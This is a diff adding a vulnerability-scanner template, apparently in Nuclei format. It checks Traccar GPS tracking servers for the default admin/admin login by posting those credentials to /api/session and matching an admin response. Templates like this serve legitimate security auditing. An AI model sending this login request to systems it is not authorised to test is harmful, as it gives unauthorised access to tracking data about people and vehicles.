@@ -1,0 +1,26 @@
+id: traccar-default-password
+info:
+  name: Traccar session API Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Traccar is an open-source GPS tracking system. It has a weak password vulnerability, where attackers can gain unauthorized access using default credentials (username: admin, password: admin).
+  reference:
+    - https://www.traccar.org/
+http:
+  - raw:
+      - |
+        POST /api/session HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        email=admin&password=admin&undefined=false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"name":"admin"'
